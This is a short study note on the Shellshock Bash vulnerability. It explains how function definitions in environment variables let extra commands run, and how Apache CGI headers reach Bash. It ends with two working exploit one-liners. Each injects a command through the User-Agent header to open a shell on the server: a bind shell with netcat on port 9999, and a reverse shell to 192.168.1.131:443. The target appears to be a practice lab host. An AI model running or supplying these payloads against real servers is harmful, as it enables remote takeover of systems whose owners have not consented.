# Notes
	1. Bash from (1.4-4.9) can execute functions when we declare environment variables.
	2. This was exploited by researcher(Stephane).
	3. As OLD CGI Scripts were build using Bash/C not Python/PERL, this exploit was affected to all Apache servers running CGI Scripts(One of the exploit from this CVE)
	4. Now, apache needs to pass some information about user from headers to body to everything to CGI scripts, and they do this via environment variables present in CGI Scripts.
	5. So, every CGI Script has environment variable associated from Apache, like HTTP_Referer, HTTP_User_Agent, etc.
	6. Now, comes the explanation of Bash Exploit.
		a. In Bash we can set functions inside environment variables, but researcher found that, even after function is ran inside env variable, execution does not end.
		b. Lets say we have variable like this `my_var=(){ignored;};/bin/ls`
		c. After execution of above function , /bin/ls is also executed.
	7. Considering this exploit, and how CGI Scripts were written in Bash, if we pass information like HTTP_Referer: () {ignored;}; /bin/ls => This will run the ls command.
	8. We can get shell from running either of scripts(bind/reverse) from below.

# Scripts
	1. echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; nc -lvnp 9999 -e /bin/sh\r\nHost: ptl-5ce6f0a8-69f5c4eb.libcurl.so\r\nConnection: close\r\n\r\n" | nc ptl-5ce6f0a8-69f5c4eb.libcurl.so 80
	2. echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; nc 192.168.1.131 443 -e /bin/sh\r\nHost: ptl-5ce6f0a8-69f5c4eb.libcurl.so\r\nConnection: close\r\n\r\n" | nc ptl-5ce6f0a8-69f5c4eb.libcurl.so 80
